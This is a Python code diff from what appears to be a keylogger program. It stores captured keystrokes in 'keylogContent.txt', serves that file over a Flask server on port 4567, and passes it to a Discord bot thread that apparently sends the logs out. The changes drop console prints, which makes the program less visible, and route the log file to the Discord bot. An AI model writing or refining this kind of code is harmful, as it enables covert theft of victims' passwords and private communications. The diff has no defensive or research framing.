@@ -10,8 +10,7 @@ logger = Logger(False)
 
 def log_periodically(filename, interval):
     while True:
-        x = logger.write_to_file(filename)
-        print(x)
+        logger.write_to_file(filename)
         sleep(interval)
 
 
@@ -28,19 +27,20 @@ s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 try:
     s.connect(('8.8.8.8', 80))
     ip_address = s.getsockname()[0]
-    print(ip_address)
 finally:
     s.close()
 
 if internet:
-    discord_thread = threading.Thread(target=DiscordBot, args=(logger.get_text_out,))
+    discord_thread = threading.Thread(target=DiscordBot, args=(logger.get_text_out,"keylogContent.txt",))
     discord_thread.start()
+
     web_request = WebRequest("keylogContent.txt")
-    flask_thread = threading.Thread(target=web_request.run, args=(str(ip_address), 4567))
+    flask_thread = threading.Thread(target=web_request.run, args=(str(ip_address), 4567,))
     flask_thread.start()
-    log_thread = threading.Thread(target=log_periodically, args=("keylogContent.txt", 40,))  # 60 seconds interval
+
+    log_thread = threading.Thread(target=log_periodically, args=("keylogContent.txt", 40,))  # 40 seconds interval
     log_thread.start()
-    
+
     discord_thread.join()
     flask_thread.join()
     log_thread.join()
